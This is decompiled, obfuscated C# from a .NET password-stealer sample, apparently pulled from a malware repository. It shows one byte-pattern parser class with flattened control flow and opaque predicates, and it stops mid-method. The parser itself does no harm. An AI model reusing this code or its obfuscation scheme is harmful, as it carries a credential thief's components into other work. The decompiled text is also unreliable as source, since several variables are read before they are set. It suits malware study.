// Decompiled with JetBrains decompiler
// Type: rw.dZ
// Assembly: DynamicMet, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AF763EB9-8CE5-4C8D-A157-180B851AA721
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f9cf1ff0097d861156fd09818614a3bb202741325fc00049356ff51a8388dfd6.exe

using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace rw
{
  public class dZ : le
  {
    protected byte[] FaF;
    private qj wae;
    private static dZ WNQ;

    public dZ()
    {
      ccw.xFvA3V();
      // ISSUE: explicit constructor call
      this.\u002Ector((byte[]) null);
    }

    public dZ(byte[] _param1)
    {
      ccw.xFvA3V();
      // ISSUE: explicit constructor call
      base.\u002Ector((TextWriter) null);
      this.Ylz(_param1);
    }

    public dZ(byte[] _param1, TextWriter _param2)
    {
      ccw.xFvA3V();
      // ISSUE: explicit constructor call
      base.\u002Ector(_param2);
      this.Ylz(_param1);
    }

    public void Ql8(byte[] _param1, TextWriter _param2)
    {
      this.elc(_param2);
      this.Ylz(_param1);
    }

    public void Ylz(byte[] _param1)
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      bool flag;
      while (true)
      {
        switch (num2)
        {
          case 1:
            flag = _param1 == null;
            if (dZ.lNh())
            {
              num2 = 0;
              continue;
            }
            goto label_1;
          default:
            goto label_7;
        }
      }
label_7:
      if (flag)
        _param1 = new byte[0];
      this.FaF = _param1;
      this.Wl2 = _param1.Length;
      this.wae.pln = new SortedList<int, int>();
      this.wae.pln[0] = 1;
    }

    public byte[] wan() => this.FaF;

    public bool val(le.awF _param1, out byte[] _param2)
    {
      int wlr = this.wlr;
      bool flag;
      if (!_param1())
      {
label_1:
        _param2 = (byte[]) null;
        flag = false;
        switch (2)
        {
          case 1:
            break;
          case 2:
            goto label_5;
          default:
            goto label_1;
        }
      }
      else
        goto label_6;
label_2:
      int index;
      _param2[index] = this.FaF[index + wlr];
      ++index;
label_4:
      int length;
      if (index >= length)
        flag = true;
      else
        goto label_2;
label_5:
      return flag;
label_6:
      length = this.wlr - wlr;
      _param2 = new byte[length];
      index = 0;
      goto label_4;
    }

    public bool oaa(le.awF _param1, out dL _param2)
    {
      int num = 1;
      while (true)
      {
        switch (num)
        {
          case 1:
            _param2.XlX = this.wlr;
            num = dZ.lNh() ? 0 : 0;
            continue;
          default:
            goto label_2;
        }
      }
label_2:
      bool flag = _param1();
      _param2.jl1 = this.wlr;
      return flag;
    }

    public bool daE(le.awF _param1, out int _param2)
    {
      _param2 = 0;
      bool flag1;
      byte[] numArray;
      if (this.val(_param1, out numArray))
      {
        _param2 = 0;
        int index = 0;
        int num1 = 0;
        if (!dZ.lNh())
          goto label_4;
label_1:
        while (true)
        {
          bool flag2;
          switch (num1)
          {
            case 1:
              if (flag2)
              {
                _param2 <<= 8;
                _param2 |= (int) numArray[index];
                ++index;
                break;
              }
              goto label_5;
            case 2:
              goto label_6;
          }
          flag2 = index < numArray.Length;
          int num2;
          num1 = dZ.lNh() ? 1 : num2;
        }
label_5:
        flag1 = true;
        goto label_6;
label_4:
        num1 = 0;
        goto label_1;
      }
      else
        goto label_9;
label_6:
      return flag1;
label_9:
      flag1 = false;
      goto label_6;
    }

    public bool GaX(le.awF _param1, out double _param2)
    {
      _param2 = 0.0;
      bool flag;
      byte[] bytes;
      if (this.val(_param1, out bytes))
        flag = double.TryParse(Encoding.UTF8.GetString(bytes), out _param2);
      else
        goto label_5;
label_4:
      return flag;
label_5:
      int num1 = 1;
      if (!dZ.lNh())
        goto label_6;
label_1:
      switch (num1)
      {
        case 1:
          flag = false;
          goto label_4;
        default:
          goto label_4;
      }
label_6:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public bool La1(int _param1, int _param2, out int _param3)
    {
      bool flag;
      if (this.wlr < this.Wl2)
      {
        _param3 = (int) this.FaF[this.wlr] >> _param1 - 1 & (1 << _param2) - 1;
        ++this.wlr;
        flag = true;
        int num1 = 0;
        if (dZ.TNw() != null)
          goto label_2;
label_1:
        switch (num1)
        {
          case 1:
            goto label_5;
          default:
            goto label_4;
        }
label_2:
        int num2;
        num1 = num2;
        goto label_1;
      }
      else
        goto label_5;
label_4:
      return flag;
label_5:
      _param3 = 0;
      flag = false;
      goto label_4;
    }

    public bool Hau(int _param1, int _param2, dZ.wwP _param3, out int _param4)
    {
      if (this.wlr >= this.Wl2)
        goto label_4;
label_2:
      byte num1 = (byte) ((int) this.FaF[this.wlr] >> _param1 - 1 & (1 << _param2) - 1);
      ++this.wlr;
      _param4 = (int) num1;
      bool flag = _param3.SL8(num1);
label_3:
      return flag;
label_4:
      _param4 = 0;
      flag = false;
      int num2 = 1;
      if (dZ.TNw() != null)
        goto label_5;
label_1:
      switch (num2)
      {
        case 1:
          goto label_3;
        default:
          goto label_2;
      }
label_5:
      int num3;
      num2 = num3;
      goto label_1;
    }

    private void kao(string _param1, string _param2)
    {
      this.il4.WriteLine("<{0}>{1}:{2}", (object) this.wlr, (object) _param1, (object) _param2);
      dZ.eNV((object) this.il4);
    }

    public virtual bool vRj(string _param1)
    {
      this.kao("FATAL", _param1);
      throw new xB();
    }

    public bool XaV(string _param1)
    {
      this.kao("WARNING", _param1);
      return true;
    }

    public bool yat(int _param1, int _param2, byte _param3)
    {
      if (this.wlr >= this.Wl2 || ((int) this.FaF[this.wlr] >> _param1 - 1 & (1 << _param2) - 1) != (int) _param3)
        goto label_2;
      else
        goto label_5;
label_1:
      bool flag;
      int num1;
      switch (num1)
      {
        case 1:
          return flag;
        default:
          flag = true;
          goto case 1;
      }
label_2:
      flag = false;
      num1 = 1;
      if (dZ.lNh())
      {
        num1 = 1;
        goto label_1;
      }
      else
        goto label_1;
label_5:
      ++this.wlr;
      int num2;
      num1 = dZ.TNw() == null ? 0 : num2;
      goto label_1;
    }

    public bool Uay(int _param1, int _param2, dZ.wwP _param3)
    {
      if (this.wlr >= this.Wl2)
        return false;
      byte num1 = (byte) ((int) this.FaF[this.wlr] >> _param1 - 1 & (1 << _param2) - 1);
      int num2 = 0;
      if (dZ.TNw() != null)
        goto label_4;
label_1:
      switch (num2)
      {
        default:
          ++this.wlr;
          return _param3.SL8(num1);
      }
label_4:
      int num3;
      num2 = num3;
      goto label_1;
    }

    public bool laJ(int _param1, int _param2, byte _param3) => this.wlr < this.Wl2 && ((int) this.FaF[this.wlr] >> _param1 - 1 & (1 << _param2) - 1) == (int) _param3;

    public bool Pad(int _param1, int _param2, byte _param3) => this.wlr >= this.Wl2 || ((int) this.FaF[this.wlr] >> _param1 - 1 & (1 << _param2) - 1) != (int) _param3;

    public bool UaO(int _param1, int _param2, out int _param3) => this.La1(_param1, _param2, out _param3);

    public bool Uaq(int _param1, int _param2, dZ.wwP _param3, out int _param4) => this.La1(_param1, _param2, out _param4);

    public bool XaH(int _param1, byte _param2)
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      bool flag;
      while (true)
      {
        int num3;
        switch (num2)
        {
          case 1:
            if (this.wlr < this.Wl2)
            {
              num2 = dZ.TNw() != null ? 0 : 0;
              continue;
            }
            num3 = 0;
            break;
          case 2:
            goto label_6;
          default:
            num3 = ((int) this.FaF[this.wlr] >> _param1 - 1 & 1) == (int) _param2 ? 1 : 0;
            break;
        }
        if (num3 != 0)
        {
          ++this.wlr;
          flag = true;
          if (dZ.lNh())
            num2 = 2;
          else
            goto label_1;
        }
        else
          goto label_9;
      }
label_6:
      return flag;
label_9:
      flag = false;
      goto label_6;
    }

    public bool sam(int _param1, byte _param2) => this.wlr < this.Wl2 && ((int) this.FaF[this.wlr] >> _param1 - 1 & 1) == (int) _param2;

    public bool AaL(int _param1, byte _param2) => this.wlr >= this.Wl2 || ((int) this.FaF[this.wlr] >> _param1 - 1 & 1) != (int) _param2;

    public bool TaI(byte _param1)
    {
      if (this.wlr >= this.Wl2 || (int) this.FaF[this.wlr] != (int) _param1)
        return false;
      int num1 = 0;
      if (dZ.TNw() == null)
        goto label_3;
label_1:
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_6;
          default:
            ++this.wlr;
            int num2;
            num1 = dZ.TNw() == null ? 1 : num2;
            continue;
        }
      }
label_6:
      return true;
label_3:
      num1 = 0;
      goto label_1;
    }

    public bool WaC(byte _param1, byte _param2)
    {
      int num1 = 2;
      bool flag;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 1:
            if ((int) this.FaF[this.wlr] == (int) _param1)
            {
              num2 = (int) this.FaF[this.wlr + 1] == (int) _param2 ? 1 : 0;
              goto label_10;
            }
            else
              break;
          case 2:
            if (this.wlr + 1 < this.Wl2)
            {
              num1 = dZ.TNw() == null ? 1 : 0;
              continue;
            }
            break;
          default:
            goto label_7;
        }
        num2 = 0;
label_10:
        if (num2 != 0)
        {
          this.wlr += 2;
          flag = true;
          num1 = dZ.TNw() == null ? 0 : 0;
        }
        else
          break;
      }
      flag = false;
label_7:
      return flag;
    }

    public bool taS(byte _param1, byte _param2, byte _param3)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            if ((int) this.FaF[this.wlr] == (int) _param1)
            {
              if (dZ.lNh())
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              goto label_12;
          case 2:
            if (this.wlr + 2 < this.Wl2)
            {
              if (dZ.TNw() == null)
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            }
            else
              goto label_12;
          default:
            goto label_11;
        }
      }
label_11:
      int num3;
      if ((int) this.FaF[this.wlr + 1] == (int) _param2)
      {
        num3 = (int) this.FaF[this.wlr + 2] == (int) _param3 ? 1 : 0;
        goto label_13;
      }
label_12:
      num3 = 0;
label_13:
      if (num3 == 0)
        return false;
      this.wlr += 3;
      return true;
    }

    public bool Aa6(byte _param1, byte _param2, byte _param3, byte _param4)
    {
      if (this.wlr + 3 >= this.Wl2 || (int) this.FaF[this.wlr] != (int) _param1 || (int) this.FaF[this.wlr + 1] != (int) _param2 || (int) this.FaF[this.wlr + 2] != (int) _param3)
        goto label_8;
      else
        goto label_3;
label_1:
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          this.wlr += 4;
          return true;
        default:
          num1 = (int) this.FaF[this.wlr + 3] == (int) _param4 ? 1 : 0;
          goto label_9;
      }
label_3:
      num2 = dZ.TNw() != null ? 0 : 0;
      goto label_1;
label_8:
      num1 = 0;
label_9:
      if (num1 == 0)
        return false;
      num2 = 1;
      if (!dZ.lNh())
      {
        int num3;
        num2 = num3;
        goto label_1;
      }
      else
        goto label_1;
    }

    public bool Ba0(byte _param1, byte _param2, byte _param3, byte _param4, byte _param5)
    {
      int num1;
      if (this.wlr + 4 < this.Wl2 && (int) this.FaF[this.wlr] == (int) _param1 && (int) this.FaF[this.wlr + 1] == (int) _param2 && (int) this.FaF[this.wlr + 2] == (int) _param3 && (int) this.FaF[this.wlr + 3] == (int) _param4)
      {
        int num2 = 1;
        if (!dZ.lNh())
          goto label_5;
label_1:
        switch (num2)
        {
          case 1:
            num1 = (int) this.FaF[this.wlr + 4] == (int) _param5 ? 1 : 0;
            goto label_8;
          default:
            goto label_6;
        }
label_5:
        int num3;
        num2 = num3;
        goto label_1;
      }
      else
        goto label_7;
label_6:
      return false;
label_7:
      num1 = 0;
label_8:
      if (num1 != 0)
      {
        this.wlr += 5;
        return true;
      }
      goto label_6;
    }

    public bool PaP(
      byte _param1,
      byte _param2,
      byte _param3,
      byte _param4,
      byte _param5,
      byte _param6)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      bool flag;
      while (true)
      {
        int num3;
        switch (num2)
        {
          case 1:
            if ((int) this.FaF[this.wlr] == (int) _param1 && (int) this.FaF[this.wlr + 1] == (int) _param2 && (int) this.FaF[this.wlr + 2] == (int) _param3 && (int) this.FaF[this.wlr + 3] == (int) _param4 && (int) this.FaF[this.wlr + 4] == (int) _param5)
            {
              num3 = (int) this.FaF[this.wlr + 5] == (int) _param6 ? 1 : 0;
              goto label_12;
            }
            else
              break;
          case 2:
            if (this.wlr + 5 < this.Wl2)
            {
              num2 = !dZ.lNh() ? 1 : 1;
              continue;
            }
            break;
          case 3:
label_6:
            flag = false;
            if (dZ.lNh())
            {
              num2 = 0;
              continue;
            }
            goto label_1;
          default:
            goto label_3;
        }
        num3 = 0;
label_12:
        if (num3 == 0)
          goto label_6;
        else
          goto label_5;
      }
label_3:
      return flag;
label_5:
      this.wlr += 6;
      flag = true;
      goto label_3;
    }

    public bool vaD(
      byte _param1,
      byte _param2,
      byte _param3,
      byte _param4,
      byte _param5,
      byte _param6,
      byte _param7)
    {
      if (this.wlr + 6 >= this.Wl2 || (int) this.FaF[this.wlr] != (int) _param1 || (int) this.FaF[this.wlr + 1] != (int) _param2 || (int) this.FaF[this.wlr + 2] != (int) _param3 || (int) this.FaF[this.wlr + 3] != (int) _param4)
        goto label_8;
      else
        goto label_3;
label_1:
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          break;
        case 2:
          return true;
        default:
          if ((int) this.FaF[this.wlr + 4] == (int) _param5 && (int) this.FaF[this.wlr + 5] == (int) _param6)
          {
            num1 = (int) this.FaF[this.wlr + 6] == (int) _param7 ? 1 : 0;
            goto label_9;
          }
          else
            goto label_8;
      }
label_2:
      return false;
label_3:
      num2 = dZ.lNh() ? 0 : 0;
      goto label_1;
label_8:
      num1 = 0;
label_9:
      if (num1 != 0)
      {
        this.wlr += 7;
        num2 = 2;
        goto label_1;
      }
      else
        goto label_2;
    }

    public bool Rac(
      byte _param1,
      byte _param2,
      byte _param3,
      byte _param4,
      byte _param5,
      byte _param6,
      byte _param7,
      byte _param8)
    {
      int num1;
      if (this.wlr + 7 < this.Wl2 && (int) this.FaF[this.wlr] == (int) _param1 && (int) this.FaF[this.wlr + 1] == (int) _param2 && (int) this.FaF[this.wlr + 2] == (int) _param3)
      {
        int num2 = 2;
        if (!dZ.lNh())
          goto label_5;
label_2:
        while (true)
        {
          switch (num2)
          {
            case 1:
              if ((int) this.FaF[this.wlr + 4] == (int) _param5 && (int) this.FaF[this.wlr + 5] == (int) _param6 && (int) this.FaF[this.wlr + 6] == (int) _param7)
              {
                if (dZ.TNw() == null)
                {
                  num2 = 0;
                  continue;
                }
                break;
              }
              goto label_13;
            case 2:
              if ((int) this.FaF[this.wlr + 3] == (int) _param4)
              {
                if (dZ.TNw() == null)
                {
                  num2 = 1;
                  continue;
                }
                break;
              }
              goto label_13;
            default:
              goto label_10;
          }
          int num3;
          num2 = num3;
        }
label_10:
        num1 = (int) this.FaF[this.wlr + 7] == (int) _param8 ? 1 : 0;
        goto label_14;
label_5:
        num2 = 2;
        goto label_2;
      }
label_13:
      num1 = 0;
label_14:
      if (num1 == 0)
        return false;
      this.wlr += 8;
      return true;
    }

    public bool ba3(byte[] _param1)
    {
      int length = _param1.Length;
      bool flag;
      if (this.wlr + length <= this.Wl2)
      {
        int index = 0;
label_7:
        if (index >= length)
          goto label_6;
        else
          goto label_4;
label_1:
        int num1;
        switch (num1)
        {
          case 2:
            goto label_7;
          case 3:
            goto label_8;
          default:
            goto label_10;
        }
label_4:
        if ((int) _param1[index] == (int) this.FaF[this.wlr + index])
        {
          ++index;
          num1 = 2;
          goto label_1;
        }
        else
          goto label_8;
label_6:
        this.wlr += length;
        flag = true;
        num1 = 1;
        if (dZ.TNw() != null)
        {
          num1 = 1;
          goto label_1;
        }
        else
          goto label_1;
label_8:
        flag = false;
        int num2;
        num1 = dZ.lNh() ? 0 : num2;
        goto label_1;
      }
      else
        flag = false;
label_10:
      return flag;
    }

    public static byte ha5(byte _param0)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_7;
          case 2:
            if (_param0 < (byte) 97)
            {
              num1 = !dZ.lNh() ? 1 : 1;
              continue;
            }
            goto label_2;
          default:
            goto label_5;
        }
      }
label_2:
      int num2 = _param0 <= (byte) 122 ? 1 : 0;
      goto label_8;
label_5:
      return _param0;
label_7:
      num2 = 0;
label_8:
      if (num2 != 0)
        return (byte) ((uint) _param0 - 32U);
      goto label_5;
    }

    public bool yaA(byte _param1)
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      while (true)
      {
        int num3;
        switch (num2)
        {
          case 1:
            if (this.wlr < this.Wl2)
            {
              if (dZ.lNh())
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
            {
              num3 = 0;
              break;
            }
          case 2:
            goto label_7;
          default:
            num3 = (int) dZ.ha5(this.FaF[this.wlr]) == (int) _param1 ? 1 : 0;
            break;
        }
        if (num3 != 0)
        {
          if (dZ.TNw() == null)
            num2 = 2;
          else
            goto label_1;
        }
        else
          break;
      }
      return false;
label_7:
      ++this.wlr;
      return true;
    }

    public bool waZ(byte _param1, byte _param2)
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      bool flag;
      while (true)
      {
        int num3;
        switch (num2)
        {
          case 1:
            if (this.wlr + 1 >= this.Wl2)
            {
              if (dZ.TNw() == null)
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
            {
              if ((int) dZ.WNq(this.FaF[this.wlr]) == (int) dZ.ha5(_param1))
              {
                num3 = (int) dZ.ha5(this.FaF[this.wlr + 1]) == (int) dZ.WNq(_param2) ? 1 : 0;
                break;
              }
              goto default;
            }
          case 2:
            goto label_8;
          default:
            num3 = 0;
            break;
        }
        if (num3 != 0)
        {
          this.wlr += 2;
          flag = true;
          num2 = dZ.lNh() ? 2 : 0;
        }
        else
          break;
      }
      flag = false;
label_8:
      return flag;
    }

    public bool HaR(byte _param1, byte _param2, byte _param3)
    {
      if (this.wlr + 2 < this.Wl2 && (int) dZ.ha5(this.FaF[this.wlr]) == (int) dZ.ha5(_param1) && (int) dZ.ha5(this.FaF[this.wlr + 1]) == (int) dZ.ha5(_param2) && (int) dZ.ha5(this.FaF[this.wlr + 2]) == (int) dZ.WNq(_param3))
      {
        int num = 0;
        if (dZ.TNw() != null)
          goto label_4;
label_1:
        switch (num)
        {
          case 1:
            goto label_5;
          default:
            this.wlr += 3;
            return true;
        }
label_4:
        num = 0;
        goto label_1;
      }
label_5:
      return false;
    }

    public bool qah(byte _param1, byte _param2, byte _param3, byte _param4)
    {
      if (this.wlr + 3 >= this.Wl2 || (int) dZ.ha5(this.FaF[this.wlr]) != (int) dZ.WNq(_param1) || (int) dZ.WNq(this.FaF[this.wlr + 1]) != (int) dZ.ha5(_param2))
        goto label_9;
      else
        goto label_2;
label_1:
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          if ((int) dZ.ha5(this.FaF[this.wlr + 2]) == (int) dZ.WNq(_param3))
          {
            num1 = (int) dZ.ha5(this.FaF[this.wlr + 3]) == (int) dZ.ha5(_param4) ? 1 : 0;
            goto label_10;
          }
          else
            goto label_9;
        default:
          return true;
      }
label_2:
      int num3;
      num2 = dZ.TNw() == null ? 1 : num3;
      goto label_1;
label_9:
      num1 = 0;
label_10:
      if (num1 == 0)
        return false;
      this.wlr += 4;
      num2 = 0;
      if (dZ.lNh())
      {
        num2 = 0;
        goto label_1;
      }
      else
        goto label_1;
    }

    public bool QaU(byte _param1, byte _param2, byte _param3, byte _param4, byte _param5)
    {
      if (this.wlr + 4 >= this.Wl2 || (int) dZ.ha5(this.FaF[this.wlr]) != (int) dZ.ha5(_param1) || (int) dZ.ha5(this.FaF[this.wlr + 1]) != (int) dZ.ha5(_param2))
        goto label_9;
      else
        goto label_3;
label_1:
      int num1;
      int num2;
      switch (num2)
      {
        case 1:
          goto label_5;
        default:
          if ((int) dZ.ha5(this.FaF[this.wlr + 2]) == (int) dZ.ha5(_param3) && (int) dZ.WNq(this.FaF[this.wlr + 3]) == (int) dZ.ha5(_param4))
          {
            num1 = (int) dZ.ha5(this.FaF[this.wlr + 4]) == (int) dZ.ha5(_param5) ? 1 : 0;
            goto label_10;
          }
          else
            goto label_9;
      }
label_3:
      num2 = !dZ.lNh() ? 0 : 0;
      goto label_1;
label_5:
      bool flag;
      return flag;
label_9:
      num1 = 0;
label_10:
      if (num1 == 0)
      {
        flag = false;
        goto label_5;
      }
      else
      {
        this.wlr += 5;
        flag = true;
        num2 = 1;
        if (dZ.TNw() != null)
        {
          int num3;
          num2 = num3;
          goto label_1;
        }
        else
          goto label_1;
      }
    }

    public bool na9(
      byte _param1,
      byte _param2,
      byte _param3,
      byte _param4,
      byte _param5,
      byte _param6)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            if ((int) dZ.ha5(this.FaF[this.wlr]) == (int) dZ.ha5(_param1))
            {
              num2 = !dZ.lNh() ? 1 : 3;
              continue;
            }
            goto label_12;
          case 2:
            if (this.wlr + 5 < this.Wl2)
            {
              if (dZ.TNw() == null)
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            }
            else
              goto label_12;
          case 3:
            goto label_6;
          default:
            goto label_4;
        }
      }
label_4:
      return false;
label_6:
      int num3;
      if ((int) dZ.ha5(this.FaF[this.wlr + 1]) == (int) dZ.WNq(_param2) && (int) dZ.ha5(this.FaF[this.wlr + 2]) == (int) dZ.ha5(_param3) && (int) dZ.ha5(this.FaF[this.wlr + 3]) == (int) dZ.ha5(_param4) && (int) dZ.ha5(this.FaF[this.wlr + 4]) == (int) dZ.ha5(_param5))
      {
        num3 = (int) dZ.ha5(this.FaF[this.wlr + 5]) == (int) dZ.ha5(_param6) ? 1 : 0;
        goto label_13;
      }
label_12:
      num3 = 0;
label_13:
      if (num3 != 0)
      {
        this.wlr += 6;
        return true;
      }
      goto label_4;
    }

    public bool zaG(
      byte _param1,
      byte _param2,
      byte _param3,
      byte _param4,
      byte _param5,
      byte _param6,
      byte _param7)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      while (true)
      {
        int num3;
        switch (num2)
        {
          case 1:
            if ((int) dZ.ha5(this.FaF[this.wlr]) == (int) dZ.WNq(_param1) && (int) dZ.WNq(this.FaF[this.wlr + 1]) == (int) dZ.WNq(_param2) && (int) dZ.ha5(this.FaF[this.wlr + 2]) == (int) dZ.ha5(_param3) && (int) dZ.ha5(this.FaF[this.wlr + 3]) == (int) dZ.ha5(_param4) && (int) dZ.ha5(this.FaF[this.wlr + 4]) == (int) dZ.WNq(_param5))
            {
              if (dZ.TNw() == null)
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
              break;
          case 2:
            if (this.wlr + 6 < this.Wl2)
            {
              if (dZ.TNw() == null)
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            }
            else
              break;
          case 3:
            goto label_3;
          default:
            if ((int) dZ.ha5(this.FaF[this.wlr + 5]) == (int) dZ.ha5(_param6))
            {
              num3 = (int) dZ.ha5(this.FaF[this.wlr + 6]) == (int) dZ.ha5(_param7) ? 1 : 0;
              goto label_13;
            }
            else
              break;
        }
        num3 = 0;
label_13:
        if (num3 != 0)
          num2 = 3;
        else
          goto label_10;
      }
label_3:
      this.wlr += 7;
      return true;
label_10:
      return false;
    }

    public bool sav(byte[] _param1)
    {
      int length = _param1.Length;
      bool flag = this.wlr + length > this.Wl2;
      int num = 2;
      while (true)
      {
        int index;
        switch (num)
        {
          case 1:
label_8:
            if ((int) _param1[index] != (int) dZ.ha5(this.FaF[this.wlr + index]))
            {
              num = dZ.TNw() == null ? 0 : 0;
              continue;
            }
            ++index;
            break;
          case 2:
            if (!flag)
            {
              index = 0;
              break;
            }
            goto label_10;
          default:
            goto label_6;
        }
        if (index < length)
          goto label_8;
        else
          break;
      }
      this.wlr += length;
      return true;
label_6:
      return false;
label_10:
      return false;
    }

    public bool jab(byte _param1, byte _param2)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 1:
            if (this.wlr < this.Wl2)
            {
              num1 = dZ.TNw() == null ? 0 : 0;
              continue;
            }
            goto label_8;
          case 2:
            goto label_2;
          default:
            goto label_7;
        }
      }
label_2:
      return false;
label_7:
      int num2;
      if ((int) this.FaF[this.wlr] >= (int) _param1)
      {
        num2 = (int) this.FaF[this.wlr] <= (int) _param2 ? 1 : 0;
        goto label_9;
      }
label_8:
      num2 = 0;
label_9:
      if (num2 != 0)
      {
        ++this.wlr;
        return true;
      }
      goto label_2;
    }

    public bool fap(byte _param1, byte _param2, byte _param3, byte _param4)
    {
      if (this.wlr < this.Wl2)
      {
        byte num1 = this.FaF[this.wlr];
        if ((int) num1 < (int) _param1)
          goto label_2;
        else
          goto label_4;
label_1:
        bool flag;
        int num2;
        int num3;
        switch (num3)
        {
          case 1:
            if ((int) num1 <= (int) _param2)
            {
              num2 = 1;
              goto label_11;
            }
            else
              break;
          case 2:
            goto label_7;
          default:
            if (flag)
            {
              ++this.wlr;
              return true;
            }
            goto case 2;
        }
label_2:
        num2 = (int) num1 < (int) _param3 ? 0 : ((int) num1 <= (int) _param4 ? 1 : 0);
        goto label_11;
label_4:
        num3 = dZ.lNh() ? 1 : 0;
        goto label_1;
label_11:
        flag = num2 != 0;
        num3 = 0;
        if (!dZ.lNh())
        {
          int num4;
          num3 = num4;
          goto label_1;
        }
        else
          goto label_1;
      }
label_7:
      return false;
    }

    public bool jaY(
      byte _param1,
      byte _param2,
      byte _param3,
      byte _param4,
      byte _param5,
      byte _param6)
    {
      int num1 = 4;
label_1:
      int num2 = num1;
      bool flag1;
      while (true)
      {
        bool flag2;
        byte num3;
        int num4;
        switch (num2)
        {
          case 1:
            num4 = (int) num3 < (int) _param5 ? 0 : ((int) num3 <= (int) _param6 ? 1 : 0);
            goto label_17;
          case 2:
            goto label_6;
          case 3:
            if (flag2)
            {
              num3 = this.FaF[this.wlr];
              if ((int) num3 < (int) _param1 || (int) num3 > (int) _param2)
              {
                if ((int) num3 < (int) _param3)
                {
                  if (dZ.lNh())
                  {
                    num2 = 1;
                    continue;
                  }
                  goto label_1;
                }
                else if ((int) num3 > (int) _param4)
                  goto case 1;
              }
              num4 = 1;
              goto label_17;
            }
            else
              break;
          case 4:
            flag2 = this.wlr < this.Wl2;
            num2 = 3;
            continue;
          default:
            goto label_5;
        }
label_10:
        flag1 = false;
        num2 = 2;
        continue;
label_17:
        if (num4 != 0)
        {
          if (dZ.lNh())
            num2 = 0;
          else
            goto label_1;
        }
        else
          goto label_10;
      }
label_5:
      ++this.wlr;
      flag1 = true;
label_6:
      return flag1;
    }

    public bool caK(
      byte _param1,
      byte _param2,
      byte _param3,
      byte _param4,
      byte _param5,
      byte _param6,
      byte _param7,
      byte _param8)
    {
      if (this.wlr >= this.Wl2)
        goto label_12;
      else
        goto label_8;
label_6:
      bool flag;
      return flag;
label_8:
      byte num1 = this.FaF[this.wlr];
      int num2 = 1;
      if (!dZ.lNh())
        goto label_9;
label_1:
      while (true)
      {
        switch (num2)
        {
          case 1:
            if ((int) num1 < (int) _param1 || (int) num1 > (int) _param2)
            {
              if ((int) num1 >= (int) _param3)
              {
                num2 = 2;
                continue;
              }
              break;
            }
            goto label_15;
          case 2:
            if ((int) num1 <= (int) _param4)
              goto label_15;
            else
              break;
          case 3:
            goto label_6;
          default:
            goto label_13;
        }
        if ((int) num1 < (int) _param5)
        {
          int num3;
          num2 = dZ.lNh() ? 0 : num3;
        }
        else
          break;
      }
      if ((int) num1 <= (int) _param6)
        goto label_15;
label_13:
      int num4 = (int) num1 < (int) _param7 ? 0 : ((int) num1 <= (int) _param8 ? 1 : 0);
      goto label_16;
label_15:
      num4 = 1;
label_16:
      if (num4 != 0)
      {
        ++this.wlr;
        flag = true;
        goto label_6;
      }
      else
        goto label_12;
label_9:
      num2 = 1;
      goto label_1;
label_12:
      flag = false;
      goto label_6;
    }

    public bool jak(byte[] _param1)
    {
      if (this.wlr < this.Wl2)
        goto label_12;
label_3:
      bool flag1 = false;
label_4:
      return flag1;
label_12:
      int num1 = 1;
      if (dZ.lNh())
        goto label_2;
label_1:
      int num2;
      num1 = num2;
label_2:
      while (true)
      {
        int index;
        bool flag2;
        byte num3;
        switch (num1)
        {
          case 1:
            num3 = this.FaF[this.wlr];
            if (dZ.lNh())
            {
              num1 = 0;
              continue;
            }
            goto label_1;
          case 2:
            goto label_4;
          case 3:
            if (flag2)
            {
              if ((int) num3 < (int) _param1[index] || (int) num3 > (int) _param1[index + 1])
              {
                index += 2;
                break;
              }
              goto label_10;
            }
            else
              goto label_3;
          default:
            index = 0;
            break;
        }
        flag2 = index < _param1.Length - 1;
        if (dZ.TNw() == null)
          num1 = 3;
        else
          goto label_1;
      }
label_10:
      ++this.wlr;
      flag1 = true;
      goto label_4;
    }

    public bool das(byte[] _param1)
    {
      bool flag1;
      if (this.wlr < this.Wl2)
      {
        byte num1 = this.FaF[this.wlr];
        int index = 0;
        while (true)
        {
          bool flag2 = index < _param1.Length - 1;
          int num2 = 2;
label_1:
          int num3 = num2;
          while (true)
          {
            int num4;
            switch (num3)
            {
              case 1:
                if ((int) num1 >= (int) _param1[index])
                {
                  num3 = 3;
                  continue;
                }
                num4 = 0;
                break;
              case 2:
                if (flag2)
                  goto case 1;
                else
                  goto label_11;
              case 3:
                num4 = (int) num1 <= (int) _param1[index + 1] ? 1 : 0;
                break;
              default:
                goto label_5;
            }
            if (num4 != 0)
            {
              flag1 = false;
              if (dZ.lNh())
                num3 = 0;
              else
                goto label_1;
            }
            else
              break;
          }
          index += 2;
        }
label_11:
        ++this.wlr;
        flag1 = true;
      }
      else
        goto label_10;
label_5:
      return flag1;
label_10:
      flag1 = false;
      goto label_5;
    }

    public bool eaj(byte _param1, byte _param2)
    {
      bool flag;
      if (this.wlr >= this.Wl2 || (int) this.FaF[this.wlr] != (int) _param1 && (int) this.FaF[this.wlr] != (int) _param2)
        flag = false;
      else
        goto label_5;
label_4:
      return flag;
label_5:
